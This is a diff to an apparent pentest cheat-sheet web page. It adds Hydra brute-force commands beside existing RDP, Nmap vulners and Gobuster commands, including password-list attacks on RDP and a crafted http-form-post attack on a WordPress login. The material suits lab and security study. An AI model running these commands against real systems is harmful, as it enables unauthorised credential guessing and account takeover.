@@ -23,6 +23,7 @@ There is a :
 	<li> <a href='#n1.3'> Find </a> commands in Linux
 	<li> Nmap <a href='#n1.4'> commands </a> with vulners script
 	<li> <a href='#n1.5'>Gobuster </a> dirs enumeration command
+	<li> <a href='#n1.6'> Hydra </a> commands
 <h3 id='n1.1'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote Desktop Protocol (RDP)</h3>
   <pre><code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'></code></pre>
   <p><pre><code>xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard</code></pre>
@@ -59,6 +60,16 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 	   
 <h3 id='n1.5'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Gobuster command</h3>
    <pre><code> gobuster dir &lt;TARGET_URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </code></pre>
+		
+<h3 id='n1.6'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hyrda </h3>
+   Brute force against a protocol of some choice -
+   <pre><code> hydra -P &lt;WORLIST> -v &lt;TARGET_IP> &kt;PROTOCOL> </code></pre>
+   <p> 	Can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in some lists. (-vV = verbose mode, showing login attempts) -
+   <pre><code> hydra -v -V -u -L &lt;USERNAME_LIST> -P &lt;PASSWORD_LIST> -t 1 -u &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
+   <p> Attack a Windows Remote Desktop with a password list -
+   <pre><code> hydra -t 1 -V -f -l &lt;USERNAME> -P &lt;WORDLIST> rdp://&lt;TARGET_IP> </code></pre>
+   <p> Craft a more specific request for Hydra to brute force -
+   <pre><code> hydra -l &lt;USERNAME> -P .&lt;PASSWORD_LIST> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' </code></pre>
 	
 <h2 align='center' id='n2'><em>Payloads</em></h2>
     <h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XSS Payloads</h3>
